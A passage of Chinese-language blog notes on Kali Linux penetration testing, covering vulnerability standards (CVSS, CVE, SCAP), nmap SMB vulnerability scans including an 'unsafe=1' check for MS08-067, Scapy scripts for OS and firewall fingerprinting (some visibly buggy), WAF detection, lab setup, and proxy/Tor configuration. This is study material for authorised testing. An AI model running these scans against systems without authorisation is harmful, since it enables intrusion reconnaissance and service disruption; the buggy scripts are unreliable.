<pre><code>（1）https://www.exploit-db.com Kali 官方公布的漏洞代码
（2）searchsploit 服务类型  查找相关漏洞利用代码 （相干文件放在usr/share/exploitdb/platforms）
（3）Kali自带工具 sandi-gui  ▲2019.12.7暂无此工具</code></pre></blockquote>
<h4 id="2-从信息的维度定义漏洞管理"><a href="#2-从信息的维度定义漏洞管理" class="headerlink" title="2. 从信息的维度定义漏洞管理"></a>2. 从信息的维度定义漏洞管理</h4><ul>
<li>信息收集：<ul>
<li>扫描发现网络IP、OS、服务、配置、漏洞</li>
<li>能力要求：定义扫描方式内容和目标</li>
</ul>
</li>
<li>信息管理<ul>
<li>格式化信息，并进行筛选、分组、定义优先级</li>
<li>能力要求：资产分组、指定所有者、向所有者报告漏洞</li>
</ul>
</li>
<li>信息输出<ul>
<li>向不同层级的人群展示足够的信息量</li>
<li>能力需求：生成报告、导出数据、与SIEM集成</li>
</ul>
</li>
</ul>
<h4 id="3-弱点扫描类型"><a href="#3-弱点扫描类型" class="headerlink" title="3. 弱点扫描类型"></a>3. 弱点扫描类型</h4><ul>
<li>主动扫描<ul>
<li>有身份验证</li>
<li>无身份验证</li>
</ul>
</li>
<li>被动扫描<ul>
<li>镜像端口抓包</li>
<li>其他来源输入</li>
</ul>
</li>
<li>基于Agent的扫描<ul>
<li>支持平台有限</li>
</ul>
</li>
</ul>
<h4 id="4-漏洞概念"><a href="#4-漏洞概念" class="headerlink" title="4. 漏洞概念"></a>4. 漏洞概念</h4><ul>
<li>CVSS（Common Vulnerability Scoring System）<ul>
<li>通用漏洞评分系统–工业标准</li>
<li>扫描安全漏洞严重程度的统一评分方案</li>
<li>V3版本–2015年6月10日</li>
<li>Basic Metric：基础的恒定不变的弱点权重</li>
<li>Temporal Metric：依赖时间因素的弱点权重</li>
<li>Enviromental Metric：利用弱点的环境要求和实施难度的权重</li>
<li>CVSS是安全内容自动化协议（SCAP）的一部分</li>
<li>通常CVSS与CVE一同由美国国家漏洞库（NVD）发布并保持数据的更新</li>
<li>分值范围：0–10</li>
<li>不同机构按CVSS分值定义威胁的中、高、低威胁级别</li>
<li>CVSS体现弱点的风险，威胁级别（severity）表示弱点风险对企业的影响</li>
<li>CVSS分值是工业标准，但威胁级别不是</li>
</ul>
</li>
<li>Vulnerability Reference</li>
<li>CVE（Common Vulnerability and Exposures）<ul>
<li>已公开的信息安全漏洞字典，统一的漏洞编号标准</li>
<li>MITRE公司负责维护（非盈利机构）</li>
<li>扫描器的大部分扫描项都对应一个CVE编号</li>
<li>实现不同产商之间信息交换的统一标准</li>
</ul>
</li>
<li>CVE发布流程<ul>
<li>发现漏洞</li>
<li>CAN负责指定CVE ID</li>
<li>发布到CVE List–CVE-2008-4250</li>
<li>MITRE负责对内容进行编辑维护</li>
</ul>
</li>
</ul>
<h4 id="5-漏洞基本概念"><a href="#5-漏洞基本概念" class="headerlink" title="5. 漏洞基本概念"></a>5. 漏洞基本概念</h4><ul>
<li><p>很多产商维护自己的Vulnerability Reference</p>
<ul>
<li>MS</li>
<li>MSKB</li>
</ul>
</li>
<li><p>其他Vulnerability Reference</p>
<ul>
<li>CERT TA08-297A</li>
<li>BID 31874</li>
<li>IAVM 2008-A-0081</li>
<li>OVAL OVAL6093</li>
</ul>
</li>
<li><p>OVAL（Open Vulnerability and Assessment Language）</p>
<ul>
<li>描述漏洞检测方法的机器可识别语言</li>
<li>详细的描述漏洞检测的技术细节，可导入自动化检测工具实施漏洞检测工具</li>
<li>OVAL使用XML语言描述，包含了严密的语法逻辑</li>
</ul>
</li>
<li><p>CCE</p>
<ul>
<li>描述软件配置缺陷的一种标准化格式</li>
<li>在信息安全风险评估，配置缺陷的检测是一项重要内容，使用CCE可以配置缺陷以标准的方式展现出来，便于配置缺陷评估的可量化操作</li>
</ul>
</li>
<li><p>CPE（Common Product Enumeration）</p>
<ul>
<li>信息技术产品、系统、软件包的结构化命令规范，分类命名</li>
</ul>
</li>
<li><p>CWE（Common Weakness Enumeration）</p>
<ul>
<li>常见漏洞类型的字典，描述不同类型漏洞的特征（访问控制、信息泄露、拒绝服务）</li>
</ul>
</li>
<li><p>Security Content Automation Protocal（SCAP）</p>
<ul>
<li>SCAP是一个集合了多种安全标准框架</li>
<li>六个元素：CVE、OVAL、CCE、CPE、CVSS、XCCDF</li>
<li>目的是以标准的方法展示和操作安全数据</li>
<li>由NIST负责维护</li>
</ul>
</li>
<li><p>SCAP主要解决三个问题</p>
<ul>
<li>实现高层政策法规等到底层实施的落地（如FISMA，ISO27000系列）</li>
<li>将信息安全所涉及的各个要素标准化（如统一漏洞的命名及严重性度量）</li>
<li>将复杂的系统配置检查工作自动化</li>
</ul>
</li>
<li><p>SCAP是当前美国比较成熟的一套信息安全评估标准体系，其标准化、自动化的思想对信息安全行业产生了深远的影响</p>
</li>
<li><p>NVD（National Vulnerability Database）</p>
<ul>
<li>美国政府的漏洞管理标准数据</li>
<li>完全基于SCAP框架</li>
<li>实现自动化漏洞管理、安全测量、合规要求</li>
<li>包含以下库(<a href="https://nvd.nist.gov/)：" target="_blank" rel="noopener">https://nvd.nist.gov/)：</a></li>
</ul>
<ol>
<li>安全检查列表</li>
<li>软件安全漏洞</li>
<li>配置错误</li>
<li>产品名称</li>
<li>影响程度</li>
</ol>
</li>
</ul>
<h4 id="6-漏洞管理"><a href="#6-漏洞管理" class="headerlink" title="6. 漏洞管理"></a>6. 漏洞管理</h4><ul>
<li>周期性扫描跟踪漏洞</li>
<li>高危漏洞优先处理</li>
<li>扫描注意事项</li>
<li>漏洞管理三要素<ul>
<li>准确性</li>
<li>时间</li>
<li>资源</li>
</ul>
</li>
</ul>
<h4 id="7-Nmap"><a href="#7-Nmap" class="headerlink" title="7. Nmap"></a>7. Nmap</h4><ul>
<li>nmap扫描脚本<ul>
<li>600+</li>
<li>分类</li>
</ul>
</li>
<li><strong><code>🔺命令：cat /usr/share/nmap/scripts/script.db</code></strong>（存放nmap脚本名称路径）</li>
<li><strong><code>🔺命令：grep vuln /usr/share/nmap/scripts/script.db | cut -d &quot;\&quot; -f 2</code></strong></li>
<li><strong><code>🔺命令：cat /usr/share/nmap/scripts/smb-check-vuln.nse</code></strong></li>
<li><strong><code>🔺命令：smb-check-vulns.nse</code></strong><ul>
<li><strong><code>🔺命令：nmap -sU -sS --script=smb-check-vulns.nse --script=args=unsafe=1 -p U:137,T:139,446 IP地址</code></strong></li>
<li>MS08-067</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>中文输入法：桌面的设置，删除本机自带的汉语，然后apt-get install ibus ibus-pinyin，添加汉语</code></pre></blockquote>
<h4 id="8-Nmap"><a href="#8-Nmap" class="headerlink" title="8. Nmap"></a>8. Nmap</h4><ul>
<li><p>smb-vuln-ms10-061.nse</p>
<ul>
<li>Stuxnet蠕虫利用的4个漏洞之一（美国军方打击伊朗核设施攻击的阵亡病毒）</li>
<li>Print Spooler权限不当，打印请求可在系统目录可创建文件、执行任意代码</li>
<li>LANMAN API枚举共享打印机</li>
<li>远程共享打印机名称</li>
<li>smb-enum-shares枚举共享</li>
</ul>
<ol>
<li>身份认证参数–smbuser、smbpassword</li>
<li><strong><code>🔺命令：nmap -p445 --script=smb-enum-shares.nse --script-args=smbuser=admin,smbpassword=pass IP地址</code></strong></li>
</ol>
<ul>
<li>Windows XP，Server 2003 SP2，Vista，Server 2008，win 7</li>
</ul>
</li>
<li><p>影响扫描结果的因素</p>
</li>
</ul>
<blockquote>
<pre><code>不同扫描器对于漏洞的判断是不同的，有些是基于补丁是否安装，有些是基于端口是否开放</code></pre></blockquote>
<h4 id="9-扫描结果确认"><a href="#9-扫描结果确认" class="headerlink" title="9. 扫描结果确认"></a>9. 扫描结果确认</h4><ul>
<li>目标系统版本</li>
<li>补丁是否安装</li>
<li>是否可被入侵</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(二十)：操作系统识别</title>
    <url>/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81)%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%86%E5%88%AB/</url>
    <content><![CDATA[<hr>
<h4 id="1-操作系统识别"><a href="#1-操作系统识别" class="headerlink" title="1. 操作系统识别"></a>1. 操作系统识别</h4><ul>
<li>操作系统识别技术（默认开放的系统开放端口）<ul>
<li>种类繁多</li>
<li>好产品采用多种技术组合</li>
</ul>
</li>
<li>TTL起始值<ul>
<li>Windows：128（65-128）</li>
<li>Linux/Unix：64（1-64）</li>
<li>某些Unix：255</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>TTL值劫持路由器，使不同地区的人访问到网页不一样</code></pre></blockquote>
<h4 id="2-操作系统识别"><a href="#2-操作系统识别" class="headerlink" title="2. 操作系统识别"></a>2. 操作系统识别</h4><ul>
<li>Python<ul>
<li>form scapy.all import*</li>
<li>win=”IP地址”</li>
<li>linx=”IP地址”</li>
<li>aw=sr1(IP(dst=win)/ICMP())</li>
<li>al=sr1(IP(dst=linu)/ICMP())</li>
<li>if al[IP].ttl&lt;=64:</li>
<li>print “host is linux”</li>
<li>else:</li>
<li>print “host is windows”</li>
</ul>
</li>
<li>./ttl_os.py IP地址</li>
</ul>
<pre><code>#!/usr/bin/python
from scapy.all import*
import logging
logging.getLogger(&quot;scapy,runtime&quot;).setLevel(logging.ERROR)
import sys

if len(sys.argv)!=2:
    print &quot;Usage - ./ttl_os.py [IP Address]&quot;
    print &quot;Example - ./ttl_os.py 192.168.100.1&quot;
    print &quot;Example will perform ttl analysize to attempt to determine whether the system is Windows or Linux/Unix&quot;
    sys.exit()

ip=sys.argv[1]
ans=sr1(IP(dst=&quot;str(ip)&quot;)/ICMP(),timeout=1,verbose=0)
if ans==None:
    print &quot;No response was returned&quot;
elif int(ans[IP].ttl)&lt;=64:
    print &quot;Host is Linux/Unix&quot;
else:
    print &quot;Host is Windows&quot;</code></pre><h4 id="3-操作系统识别"><a href="#3-操作系统识别" class="headerlink" title="3. 操作系统识别"></a>3. 操作系统识别</h4><ul>
<li>nmap使用多种技术识别操作系统<ul>
<li><strong><code>🔺命令：nmap IP地址 -O</code></strong></li>
<li>系统服务特征</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>CPE国际标准化组织进行的标准化操作系统，设备类型分类</code></pre></blockquote>
<h4 id="4-操作系统识别"><a href="#4-操作系统识别" class="headerlink" title="4. 操作系统识别"></a>4. 操作系统识别</h4><ul>
<li><strong><code>🔺命令：xprobe2 IP地址</code></strong></li>
<li>结果有误差</li>
</ul>
<h4 id="5-操作系统识别"><a href="#5-操作系统识别" class="headerlink" title="5. 操作系统识别"></a>5. 操作系统识别</h4><ul>
<li>被动操作系统识别<ul>
<li>IDS</li>
<li>抓包分析</li>
</ul>
</li>
<li>被动扫描（不主动向目标主机发包，部署在网络出口的地方）</li>
<li><strong><code>🔺命令：p0f</code></strong><ul>
<li>结合ARP地址欺骗识别全网OS</li>
</ul>
</li>
</ul>
<h4 id="6-防火墙识别（尽量隐蔽）"><a href="#6-防火墙识别（尽量隐蔽）" class="headerlink" title="6. 防火墙识别（尽量隐蔽）"></a>6. 防火墙识别（尽量隐蔽）</h4><ul>
<li>通过检查回包，可能识别端口是否经过防火墙过滤</li>
<li>设备多种多样，结果过存在一定误差</li>
</ul>
<blockquote>
<pre><code>（1）防火墙内部对外部的访问连接  （2）防火墙对源地址的过滤
防火墙几种情况：
Send         Response           Type
SYN          NO              
ACK          RST                Filtered

SYN          SYN+ACK/SYN+RST 
ACK          NO                 Filtered

SYN          SYN+ACK/SYN+RST
ACK          RST                Unfiltered/Open

SYN          NO             
ACK          NO                 Closed</code></pre></blockquote>
<h4 id="7-防火墙识别"><a href="#7-防火墙识别" class="headerlink" title="7. 防火墙识别"></a>7. 防火墙识别</h4><ul>
<li>Scapy</li>
<li>Python<ul>
<li><strong><code>🔺命令：fw_detect.py IP地址 端口</code></strong> ▲ 2019.12.6 脚本实验不成功，逻辑报错</li>
</ul>
</li>
</ul>
<pre><code>#!/usr/bin/python
from scapy.all import*
import logging
logging.getLogger(&quot;scapy,runtime&quot;).setLevel(logging.ERROR)
import sys

if len(sys.argv)!=3:
    print &quot;Usage - ./fw_detect.py [Target IP] [Target Port] &quot;
    print &quot;Example - ./syn_scan.py 192.168.100.1 445&quot;
    print &quot;Example will determine if filtering exists on port 443 of host 192.168.100.1&quot;
    sys.exit()

ip=sys.argv[1]
port=sys.argv[2]

ACK_response=sr1(IP(dst=ip)/TCP(dport=port,flags=&#39;A&#39;),timeout=1,verbose=0)
SYN_response=sr1(IP(dst=ip)/TCP(dport=port,flags=&#39;S&#39;),timeout=1,verbose=0)
if (ACK_respnonse==None) and (SYN_response==None):
    print &quot;Port is either unstatefully filered or host is down&quot;
elif (ACK_respnonse==None) and ((SYN_response[flags]==18) or (SYN_response[flags==6])):
    print &quot;Stateful filtering in place&quot;
elif (SYN_response==None) and (ACK_response[flags]==4):
    print &quot;Stateful filtering in place&quot;
elif ((SYN_response[flags]==18) or (SYN_response[flags==6])) and (ACK_response[flags]==4):
    print &quot;Port is unfiltered and open&quot;
else:
    print &quot;Unable to determine if the port is filtered&quot;</code></pre><h4 id="8-防火墙识别"><a href="#8-防火墙识别" class="headerlink" title="8. 防火墙识别"></a>8. 防火墙识别</h4><ul>
<li>Nmap有系列防火墙过滤检测功能</li>
<li><strong><code>🔺命令：nmap IP地址 端口</code></strong>（默认SYN包）</li>
<li><strong><code>🔺命令：nmap -sA（ACK包） IP地址 端口</code></strong></li>
</ul>
<h4 id="9-负载均衡识别"><a href="#9-负载均衡识别" class="headerlink" title="9. 负载均衡识别"></a>9. 负载均衡识别</h4><ul>
<li>广域网负载均衡<ul>
<li>DNS</li>
<li>智能DNS（不同地区不同DNS回应）</li>
</ul>
</li>
<li>服务器负载均衡<ul>
<li>基于Web的服务器</li>
</ul>
</li>
<li>组件级负载均衡</li>
<li>HTTP-Loadbalancing<ul>
<li>Nginx</li>
<li>Apache</li>
</ul>
</li>
<li><strong><code>🔺命令：lbd www.baidu.com</code></strong></li>
<li><strong><code>🔺命令：lbd mail.163.com</code></strong></li>
</ul>
<h4 id="10-WAF识别"><a href="#10-WAF识别" class="headerlink" title="10. WAF识别"></a>10. WAF识别</h4><ul>
<li>WEB应用防火墙（基于规则的过滤 → 基于机器学习，特征识别，语法词法的过滤）</li>
<li><strong><code>🔺命令：wafw00f -l</code></strong></li>
<li><strong><code>🔺命令：wafw00f http://www.microsoft.com</code></strong></li>
<li><strong><code>🔺命令：nmap www.microsoft.com --script=http-waf-detect.nse</code></strong></li>
</ul>
<blockquote>
<pre><code>WAF产品
Profense
Barracuda
F5 Trafficshield
Citrix NetScalor
IBM Web Application Security
webApp.secure
BIG IP
ISA Server
AkamaiGHost</code></pre></blockquote>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(一)：渗透环境介绍</title>
    <url>/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80)%EF%BC%9A%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<hr>
<h4 id="1-安全问题的根源"><a href="#1-安全问题的根源" class="headerlink" title="1. 安全问题的根源"></a>1. 安全问题的根源</h4><ul>
<li>分层（固守层面，在一个固定的圈子里）<ul>
<li>软件工程师，软件开发</li>
<li>数据库管理师，数据库管理以及数据库管理软件的安装与实现</li>
<li>运维</li>
</ul>
</li>
<li>只追求功能的实现</li>
<li>最大的危险还是人</li>
</ul>
<h4 id="2-安全目标"><a href="#2-安全目标" class="headerlink" title="2. 安全目标"></a>2. 安全目标</h4><ul>
<li>先于攻击者发现和防止漏洞出现<ul>
<li>攻击型安全（攻击手段探测漏洞，主动）</li>
<li>防护型安全（投入巨大，周期很大，安全层度脆碎）</li>
</ul>
</li>
</ul>
<h4 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h4><ul>
<li>尝试挫败安全防御机制，发现系统安全弱点</li>
<li>从攻击者的角度思考，测量安全防护有效性</li>
<li>证明安全问题的存在，而非破坏（深入了解漏洞价值）</li>
<li>道德约束</li>
<li>法律</li>
</ul>
<h4 id="4-渗透测试标准"><a href="#4-渗透测试标准" class="headerlink" title="4.渗透测试标准"></a>4.渗透测试标准</h4><ul>
<li>PETS（<a href="http://www.pentest-standard.org）" target="_blank" rel="noopener">http://www.pentest-standard.org）</a></li>
<li>前期交互交互阶段（渗透测试范围，每次一个子系统的渗透测试，子系统可以为一个应用系统，要进行简单的信息交互）</li>
<li>情报收集阶段（目标系统，邮箱地址，联系人，DNS，ip，公司动态等，对目标系统进行主动的探测，端口探测，主机探测）</li>
<li>威胁建模阶段（轮廓性认识确定一条两条效率最高的途径）</li>
<li>漏洞分析阶段（软件版本是否存在漏洞，软件逆向，形成针对性代码）</li>
<li>渗透攻击阶段（阶段不一定顺利）</li>
<li>后渗透测试阶段（拿到服务器后，进一步的渗透，获取有价值的信息，很重要，危害大）</li>
<li>渗透测试报告</li>
</ul>
<h4 id="5-渗透测试标准"><a href="#5-渗透测试标准" class="headerlink" title="5.渗透测试标准"></a>5.渗透测试标准</h4><ul>
<li>渗透测试范围</li>
<li>获得授权</li>
<li>渗透测试方法<ul>
<li>是否允许社会工程学</li>
<li>是否允许拒绝服务攻击</li>
</ul>
</li>
</ul>
<h4 id="6-渗透测试误区"><a href="#6-渗透测试误区" class="headerlink" title="6.渗透测试误区"></a>6.渗透测试误区</h4><ul>
<li>扫描器就是一切<ul>
<li>忽视业务逻辑重的逻辑（普通员工有获取经历级别的信息的权限）</li>
</ul>
</li>
</ul>
<h4 id="7-KALI-Linux介绍"><a href="#7-KALI-Linux介绍" class="headerlink" title="7.KALI Linux介绍"></a>7.KALI Linux介绍</h4><ul>
<li>基于Debian的Linux发行版本</li>
<li>前身是BackTrack，2013年3月发布</li>
<li>用于渗透测试和安全审计</li>
<li>包含600+安全工具</li>
<li>FHS标准目录结构（/etc，/bin，/dev，/var等,BT改版的主要原因）</li>
<li>定制内核</li>
<li>支持ARM和手机平台（for ARM树莓派CD卡烧录）</li>
<li>开源免费</li>
</ul>
<h4 id="8-KALI-Linux策略"><a href="#8-KALI-Linux策略" class="headerlink" title="8.KALI Linux策略"></a>8.KALI Linux策略</h4><ul>
<li>Root策略（大量渗透测试需要root权限，不同于其他Linux平台）</li>
<li>网络服务策略（网络服务默认是关闭的，无自动启动脚本）</li>
<li>更新升级策略（同Debian漏洞升级一样）</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(五)：实验环境</title>
    <url>/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94)%EF%BC%9A%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<hr>
<h4 id="1-准备实验环境"><a href="#1-准备实验环境" class="headerlink" title="1. 准备实验环境"></a>1. 准备实验环境</h4><ul>
<li>渗透非授权系统的弊端</li>
<li>搭建自己的实验环境</li>
</ul>
<h4 id="2-安装虚拟机"><a href="#2-安装虚拟机" class="headerlink" title="2. 安装虚拟机"></a>2. 安装虚拟机</h4><ul>
<li>微软最新版软件<ul>
<li><a href="https://msdn.itellyou.cn" target="_blank" rel="noopener">https://msdn.itellyou.cn</a></li>
</ul>
</li>
<li>windows虚拟机<ul>
<li><a href="http://dev.modern.ie/tools/vms/" target="_blank" rel="noopener">http://dev.modern.ie/tools/vms/</a>  </li>
</ul>
</li>
<li>安装自己的虚拟机<ul>
<li>win XP</li>
<li>win 7</li>
<li>win 2003</li>
</ul>
</li>
<li>Linux虚拟机<ul>
<li><a href="http://www.turnkeylinux.org" target="_blank" rel="noopener">http://www.turnkeylinux.org</a></li>
<li>Ubuntu（Lamp安装）▲2019.11.25数据库无法登陆</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>Ubuntu Server（netstat -anol）
1.apt-get install ssh 
2.apt-get install apache2 apache2-utils（若报错，则vi /etc/apache/conf-available/fqdn.conf → ServerName localhost → a2enconf fqdn）
3.apt-get install mysql-sever libapache2-mod-auth-mysql php5-mysql ▲2019.11.25未找到php5-mysql  ▲2019.11.25数据库无法登陆
4.mysql install_db（创建数据库）
5.mysql_security_installation（数据库安全设置）
6.apt-get install php5 php-mysql php-pear php-mcrypt php-curl ▲2019.11.25未找到php5，替换为php7；未找到php-mcrypt。
由于mcrypt扩展开发的结束，扩展也从PHP 7.2中删除，并转移到一个非官方的PECL存储库中。但是，你仍然可以在PHP 5.4到PHP 7.1中找到mcrypt扩展。PHP 7.2已经发布，但是它不包含mcrypt扩展。对于PHP 7.2+， PHP使用libsodium作为加密库。</code></pre></blockquote>
<ul>
<li>Metasploitable2<ul>
<li><a href="https://sourceforge.net/projects/metasploitable/metasploitable-linux-2.0.0.zip" target="_blank" rel="noopener">https://sourceforge.net/projects/metasploitable/metasploitable-linux-2.0.0.zip</a></li>
<li>问题：/var/www/mutilltdae/config.inc（配置文件：dbname=owasp10）</li>
</ul>
</li>
</ul>
<h4 id="3-模拟真实网络"><a href="#3-模拟真实网络" class="headerlink" title="3. 模拟真实网络"></a>3. 模拟真实网络</h4><ul>
<li><p>M0n0wall防火墙（需要三个Host-only网卡，一个桥接网卡，10.1.1.1/24 and 10.1.2.1/24）</p>
<ul>
<li><a href="https://distrowatch.com/?newsid=08257" target="_blank" rel="noopener">https://distrowatch.com/?newsid=08257</a></li>
<li>需要三个Host-only网卡，10.1.1.1/24 and 10.1.2.1/24</li>
<li>一个桥接网卡，连接外网使用</li>
<li>配置</li>
</ul>
<ol>
<li>1接口指令</li>
<li>设置vlan</li>
<li>em0（网卡）→ 10 valan，em1（网卡）→ 11 valan，em2（网卡）→ 13 valan</li>
<li>指定网卡连接LAN（em1），指定网卡连接WAN（em0），指定网卡连接Option（em2）</li>
<li>重启后2指令给LAN指定ip，掩码24</li>
<li>启动dhcp，分配dhcp地址</li>
<li>3指令给WebGui设置密码 → mono（默认）</li>
<li>Kali开启Host-only，需要跟LAN口同在一个网络连接上</li>
<li>WebGUI配置Optional接口，开启，配置IP地址</li>
<li>设置网络防火墙规则，PASS,WAN,ANY,LAN subnet,ANY</li>
<li>WAN设置，Block privat networks去掉勾选</li>
</ol>
</li>
</ul>
<h4 id="4-背靠背防火墙（双层异构）"><a href="#4-背靠背防火墙（双层异构）" class="headerlink" title="4. 背靠背防火墙（双层异构）"></a>4. 背靠背防火墙（双层异构）</h4><ul>
<li>Pfsense<ul>
<li><a href="https://pfsense.org/" target="_blank" rel="noopener">https://pfsense.org/</a></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(四)：代理、Tor</title>
    <url>/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B)%EF%BC%9A%E4%BB%A3%E7%90%86%E3%80%81Tor/</url>
    <content><![CDATA[<hr>
<h4 id="1-翻墙-amp-代理"><a href="#1-翻墙-amp-代理" class="headerlink" title="1. 翻墙&amp;代理"></a>1. 翻墙&amp;代理</h4><ul>
<li>GFW长城防火墙<ul>
<li>Facebook、youtube</li>
</ul>
</li>
<li>翻墙（VPN connection、Tunnel，前提需要一台可通过GFW过滤的服务器）<ul>
<li>http代理（搭建简单，纯http传输为明文传输，易被GFW发现）</li>
<li>socks代理</li>
<li>ssh隧道（加密隧道）</li>
<li>VPN</li>
</ul>
</li>
<li>Goagent（谷歌官方提供服务）</li>
<li>Tor</li>
</ul>
<h4 id="2-代理的意以所在"><a href="#2-代理的意以所在" class="headerlink" title="2. 代理的意以所在"></a>2. 代理的意以所在</h4><ul>
<li>加密通信</li>
<li>隐藏来源</li>
<li>突破网络封锁</li>
<li>注意事项<ul>
<li>不要触及敏感地带</li>
<li>不要从事非法行为</li>
</ul>
</li>
</ul>
<h4 id="3-GOAGENT（2019-11-23GoAgent基本被墙，2019-11-29使用V2ray代理）"><a href="#3-GOAGENT（2019-11-23GoAgent基本被墙，2019-11-29使用V2ray代理）" class="headerlink" title="3. GOAGENT（2019.11.23GoAgent基本被墙，2019.11.29使用V2ray代理）"></a>3. GOAGENT（2019.11.23GoAgent基本被墙，2019.11.29使用V2ray代理）</h4><ul>
<li><a href="https://code.google.com/p/goagent/" target="_blank" rel="noopener">https://code.google.com/p/goagent/</a> ▲2019.11.23网址不可用<ul>
<li>注册：appengine.google.com</li>
</ul>
</li>
<li><a href="https://github.com/goagent/gpagent" target="_blank" rel="noopener">https://github.com/goagent/gpagent</a> ▲2019.11.23goagent delete</li>
</ul>
<blockquote>
<pre><code>IE → goagent（本地代理）→ GAE → 目标网络</code></pre></blockquote>
<h4 id="4-GOAGENT安装-（2019-11-23GoAgent基本被墙）"><a href="#4-GOAGENT安装-（2019-11-23GoAgent基本被墙）" class="headerlink" title="4. GOAGENT安装 （2019.11.23GoAgent基本被墙）"></a>4. GOAGENT安装 （2019.11.23GoAgent基本被墙）</h4><ul>
<li><a href="http://pan.baidu.com/s/1jG3USAU" target="_blank" rel="noopener">http://pan.baidu.com/s/1jG3USAU</a> （goagent软件）▲2019.11.23链接不可用</li>
<li><a href="http://pan.baidu.com/s/1dDlYw05" target="_blank" rel="noopener">http://pan.baidu.com/s/1dDlYw05</a> （goagent配置指导书）▲2019.11.23链接不可用</li>
<li><strong><code>🔺命令：Apt-get install python-dev python-greenlet python-gevent python-vte python-openssl python-crypto python-appindicator python-pip libnss3-tools</code></strong></li>
<li><strong><code>🔺命令：pip install pyOpenSSL</code></strong></li>
<li><strong><code>🔺命令：pip install gevent --upgrade</code></strong></li>
<li><strong><code>🔺命令：mkdir -p ~/.pki/nssdb</code></strong>(-p 层级创建目录)</li>
<li><strong><code>🔺命令：certutil -d sql:$HOME/.pki/nssdb -N</code></strong></li>
<li>导入证书</li>
<li>设置浏览器代理</li>
<li>使用</li>
</ul>
<blockquote>
<pre><code>设置浏览器代理
浏览器（alt+t）→ Edit → Preferences → Advanced → Certificates → View certificates → Authorities → Import → CA.crt（3 trust）</code></pre></blockquote>
<h4 id="5-Tor"><a href="#5-Tor" class="headerlink" title="5. Tor"></a>5. Tor</h4><ul>
<li>保护隐私防止被追踪</li>
<li>志愿者组成节点网络</li>
<li>长期在天朝完全无法使用<ul>
<li>感谢云（海量的IP地址）</li>
</ul>
</li>
<li>暗网<ul>
<li>互联网搜索引擎无法发现</li>
<li>互联网黑市</li>
<li>比特币交易</li>
<li>至少3跳路由包装</li>
</ul>
</li>
<li>下载和看视频是不道德的行为</li>
<li>下载（Kali Linux可apt-get，但安装复杂）<ul>
<li><a href="https://www.torproject.org/download/" target="_blank" rel="noopener">https://www.torproject.org/download/</a></li>
<li><a href="http://pan.baidu.com/s/1sjkdPO5" target="_blank" rel="noopener">http://pan.baidu.com/s/1sjkdPO5</a> ▲2019.11.23链接不可用</li>
</ul>
</li>
<li>问题1：should not be run as root（文件夹中start-tor-browser修改root，0 → 1）</li>
<li>问题2：服务启动错误（权限造成，修改所有者和组 <strong><code>🔺命令：chown -R root:root tor目录</code></strong>）</li>
</ul>
<blockquote>
<pre><code>集成网桥的连接：meek-amazon、meek-google、meek-azure</code></pre></blockquote>
<ul>
<li>暗网wiki<ul>
<li><a href="http://wiki5kauuihowqi5.onion/" target="_blank" rel="noopener">http://wiki5kauuihowqi5.onion/</a></li>
</ul>
</li>
</ul>
<h4 id="6-代理设置"><a href="#6-代理设置" class="headerlink" title="6. 代理设置"></a>6. 代理设置</h4><ul>
<li>/etc/apt/apt.conf<ul>
<li>Acquire::http::Proxy “<a href="http://127.0.0.1:8087&quot;" target="_blank" rel="noopener">http://127.0.0.1:8087&quot;</a>;</li>
<li>Acquire::https::Proxy “<a href="https://127.0.0.1:8087&quot;" target="_blank" rel="noopener">https://127.0.0.1:8087&quot;</a>;</li>
<li>Acquire::ftp::Proxy “<a href="ftp://127.0.0.1:8087&quot;" target="_blank" rel="noopener">ftp://127.0.0.1:8087&quot;</a>;</li>
<li>Acuqire::socks::Proxy “<a href="https://127.0.0.1:8087&quot;" target="_blank" rel="noopener">https://127.0.0.1:8087&quot;</a>;</li>
</ul>
</li>
<li>/etc/bash.bashrc<ul>
<li>export http_proxy=”<a href="http://username:password@proxyIP:port&quot;" target="_blank" rel="noopener">http://username:password@proxyIP:port&quot;</a></li>
<li>export ftp_proxy=”<a href="ftp://username:password@proxyIP:port&quot;" target="_blank" rel="noopener">ftp://username:password@proxyIP:port&quot;</a></li>
<li>export https_proxy=”<a href="https://username:password@proxyIP:port&quot;" target="_blank" rel="noopener">https://username:password@proxyIP:port&quot;</a></li>
<li>export socks_proxy=”<a href="https://username:password@proxyIP:port&quot;" target="_blank" rel="noopener">https://username:password@proxyIP:port&quot;</a></li>
</ul>
</li>
</ul>
<h4 id="7-代理链"><a href="#7-代理链" class="headerlink" title="7. 代理链"></a>7. 代理链</h4><ul>
<li>公开的代理服务器</li>
<li>配置代理链<ul>
<li><strong><code>🔺命令：vi /etc/proxychains.conf</code></strong></li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>strict_chain（静态链，1-5级，不会自动剔除不通的代理链）
dynamic_chain（动态链，1-5级，自动剔除不通的代理链)
random_chain（随机链，1-5级随机选级）
chain_len = 2 （只适用于dynamic_chain）
proxy_dns（域名代理链解析）
